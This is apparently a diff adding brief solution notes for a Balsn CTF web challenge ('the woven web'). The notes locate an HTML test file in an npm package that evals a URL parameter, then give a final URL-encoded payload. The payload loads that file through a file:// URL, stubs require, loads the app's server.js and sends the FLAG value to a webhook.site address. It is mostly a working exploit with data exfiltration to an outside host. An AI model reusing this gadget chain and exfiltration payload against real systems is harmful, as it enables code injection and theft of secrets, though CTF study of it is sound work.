@@ -1,0 +1,12 @@
+grep -rnw 'document.location' --include '*.html' /
+	/usr/share/npm/node_modules/columnify/node_modules/wcwidth/node_modules/defaults/node_modules/clone/test-apart-ctx.html:8: var data = document.location.search.substr(1).split('&');
+
+# Eval
+var data = document.location.search.substr(1).split('&');
+try {
+	ctx = parent[data[0]];
+	eval(decodeURIComponent(data[1]));
+	window.results = results;
+
+Final Payload
+	http://the-woven-web.balsnctf.com/?url=file:///usr/share/npm/node_modules/columnify/node_modules/wcwidth/node_modules/defaults/node_modules/clone/test-apart-ctx.html%3f%26require%2520=%2520(m)%2520=%253E%2520%257Bswitch(m)%2520%257Bcase%2520'express':return%2520()%2520=%253E%2520%257Breturn%2520%257Bget:%2520()%2520=%253E%2520%257B%257D,listen:%2520()%2520=%253E%2520%257B%257D%257D%257D;break;case%2520'redis':return%2520%257BcreateClient:%2520()%2520=%253E%2520%257B%257D%257D;break;case%2520'fs':return%2520%257BexistsSync:%2520()%2520=%253E%2520%257B%257D,unlinkSync:%2520()%2520=%253E%2520%257B%257D%257D;break;%257D%257D;s=document.createElement('script');s.src='file:///home/user/app/server.js';s.onload=()=%253E%257B(new%2520Image).src='https://webhook.site/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e/?flag='%252bFLAG%257D;document.body.appendChild(s);results=1
